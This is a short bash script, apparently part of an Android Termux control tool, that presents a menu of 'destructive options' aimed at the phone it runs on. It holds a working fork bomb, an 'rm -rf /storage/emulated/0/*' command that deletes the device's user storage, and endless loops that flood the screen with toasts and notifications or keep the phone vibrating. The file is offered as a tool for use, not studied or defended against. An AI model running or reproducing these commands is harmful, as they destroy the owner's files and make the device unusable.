#!/bin/bash

function destructive_main() {
	echo
	echo " ==> Destructive options:"
	echo
	echo " [1] fork-bomb"
	echo " [2] delete-storage"
	echo " [3] toast-bomb"
	echo " [4] notification-bomb"
	echo " [5] vibrate-bomb"
	echo

	echo " =>Use: '!quit_destructive' to exit."
	read -p " [?] Option: " input


	if [[ "$input" == "!quit_destructive" ]]; then
		break
	fi
	case $input in
		1):(){ :|: & };: ;;
		2)rm -rf /storage/emulated/0/* ;;
		3)read -p "    [?] Set text: " value ; while true ; do termux-toast $value ; done ;;
		4)read -p "    [?] Set text: " value ; while true ; do termux-notification -t '$value' ; done ;;
		5)while true; do termux-vibrate -d 2000 ; done
	esac
}
